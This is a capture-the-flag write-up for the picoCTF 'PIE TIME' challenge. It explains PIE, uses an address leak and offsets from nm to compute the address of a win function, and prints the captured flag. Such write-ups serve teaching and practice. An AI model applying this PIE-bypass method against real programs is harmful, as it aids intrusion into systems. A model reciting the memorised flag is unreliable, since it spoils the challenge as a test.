PIE TIME (Deep Dive & Manual Solve)
**Category:** Binary Exploitation
**Technique:** Bypassing PIE / Offset Calculation

## 1. The Concepts (Theory)
Before solving, we must understand the environment we are hacking.

### Virtual vs. Physical Memory
The address we see in this challenge (`0x...`) is a **Virtual Address**, not a Physical one.
*   **Physical Address:** The actual electrical cell on the RAM stick. Only the OS sees this.
*   **Virtual Address (The Illusion):** The OS gives every program a "fake" address space. This allows multiple programs to run without fighting over the same RAM cells and prevents one crashing program from killing the whole PC.
*   **Relevance:** We are hacking the **Virtual** layer. We calculate where the code lives inside this virtual simulation.

### PIE (Position Independent Executable)
*   **The Problem:** Modern operating systems randomize the **Base Address** (start location) of a program every time it runs. This is a security feature to make hacking harder.
*   **The Solution:** While the *location* changes, the **structure** of the program stays the same. The distance between functions (Offsets) is constant.

---

## 2. The Tools
We used two primary Linux tools to analyze and connect.

### `nm` (Names)
*   **Function:** Opens the "Symbol Table" (phonebook) of a compiled file.
*   **Why we used it:** Compiled code is unreadable binary. `nm` lists the names of functions and their **Static Offsets** (their location inside the file relative to byte 0).
*   **The Output (`133d T main`):**
    *   **`133d`:** The **Offset** (Distance). This is the only number we care about.
    *   **`T`:** Stands for **"Text"**. This simply means "Executable Code". It does **not** mean offset.
    *   **`main`:** The name of the function.

### `nc` (Netcat)
*   **Function:** "The Swiss Army Knife of Networking." It creates a raw TCP connection to a server.
*   **Why we used it:** The challenge is hosted on a remote server. `nc` acts as a direct pipe, letting our terminal serve as the keyboard and screen for the remote program running on port `58603`.

---

## 3. The Walkthrough (Solution)

### Step 1: Find the Static Offsets ( The Map )
We need to know the distance between the start of the file and the functions we care about. We use `nm` on the local file `vuln`.

```bash
nm ./vuln | grep -E "main|win"
```

**Output:**
```text
000000000000133d T main
00000000000012a7 T win
```
*   **Main Offset:** `0x133d`
*   **Win Offset:** `0x12a7`

### Step 2: Get the Leak ( The Connection )
We connect to the server. Because PIE is active, the OS loads the program at a random Virtual Address. The program is kind enough to print the location of `main` for us.

```bash
nc rescued-float.picoctf.net 58603
```

**Output:**
```text
Address of main: 0x6403c742133d   <-- This changes every time!
Enter the address to jump to:
```
*(We keep this terminal open so the address doesn't change).*

### Step 3: The Math ( The Logic )
We need to tell the program to jump to `win`. We can't just type `12a7` because that's just an offset, not a valid memory address. We need to calculate the **Absolute Virtual Address** of `win`.

**The Logic:**
1.  **Find Base:** We take the leaked address of `main` and subtract the `main` offset. This tells us where the program starts (Base Address).
    *   `Base` = `Leak` - `0x133d`
2.  **Find Target:** We take that Base Address and add the `win` offset.
    *   `Target` = `Base` + `0x12a7`

**The Command (in a second terminal):**
```bash
python3 -c "print(hex(0x6403c742133d - 0x133d + 0x12a7))"
```
**Result:** `0x6403c74212a7`

### Step 4: The Exploit
We paste the calculated address (`0x6403c74212a7`) back into the Netcat terminal.

**Result:**
The instruction pointer jumps to the `win` function code, executes it, and prints the flag:
`picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_30380eb8}`

---

## 4. Summary of Mechanics
*   **Offset:** The fixed distance inside the book (File).
*   **Virtual Address:** Where the book is placed on the table (Memory).
*   **PIE Bypass:** Using a known location (`main`) to mathematically derive the unknown location (`win`) by applying the difference in their offsets.
